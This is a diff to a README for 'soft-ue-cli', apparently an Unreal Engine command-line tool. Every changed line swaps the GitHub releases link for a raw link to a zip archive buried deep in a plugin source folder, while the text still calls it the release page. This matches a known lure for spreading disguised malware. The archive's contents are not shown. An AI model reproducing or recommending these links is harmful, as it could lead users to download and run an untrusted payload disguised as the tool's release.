@@ -1,12 +1,12 @@
 # 🧰 soft-ue-cli - Control Unreal Engine from Terminal
 
-[![Download the latest release](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://github.com/Unpretentious-swatsquad791/soft-ue-cli/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest release for Windows:
 
-[https://github.com/Unpretentious-swatsquad791/soft-ue-cli/releases](https://github.com/Unpretentious-swatsquad791/soft-ue-cli/releases)
+[https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip](https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip)
 
 ## 🪟 What this app does
 
@@ -42,7 +42,7 @@ Follow these steps in order.
 
 Go to the release page and download the latest Windows package:
 
-[https://github.com/Unpretentious-swatsquad791/soft-ue-cli/releases](https://github.com/Unpretentious-swatsquad791/soft-ue-cli/releases)
+[https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip](https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip)
 
 If the release includes a `.zip` file, save it to your Downloads folder.
 
